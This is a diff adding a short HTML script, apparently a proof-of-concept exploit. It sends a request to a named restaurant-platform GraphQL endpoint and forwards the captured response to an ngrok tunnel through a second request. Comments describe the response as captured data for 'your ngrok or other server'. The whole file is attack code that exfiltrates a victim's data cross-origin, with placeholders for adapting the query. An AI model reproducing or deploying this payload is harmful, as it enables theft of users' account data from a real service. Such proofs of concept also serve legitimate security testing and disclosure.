@@ -1,0 +1,24 @@
+<script>
+  const req = new XMLHttpRequest();
+  req.open("POST", "https://ws-api.toasttab.com/do-federated-gateway/v1/graphql", true);
+  
+  req.setRequestHeader('Content-Type', 'application/json'); // Set header if JSON is sent
+  
+  req.onload = function() {
+    if (req.status === 200) {
+      const res = req.responseText;
+
+      // Send the captured response data to your ngrok or other server
+      const req2 = new XMLHttpRequest();
+      req2.open("GET", "https://767c-2401-4900-1cab-f8df-b0b0-3da7-1b5d-207c.ngrok-free.app/" + encodeURIComponent(res), true);
+      req2.send();
+    }
+  };
+  
+  // Modify this to capture the POST data you need to send
+  const postData = JSON.stringify({
+    query: "{ sampleQuery }" // Replace this with actual data
+  });
+  
+  req.send(postData); // Send the POST request with payload
+</script>
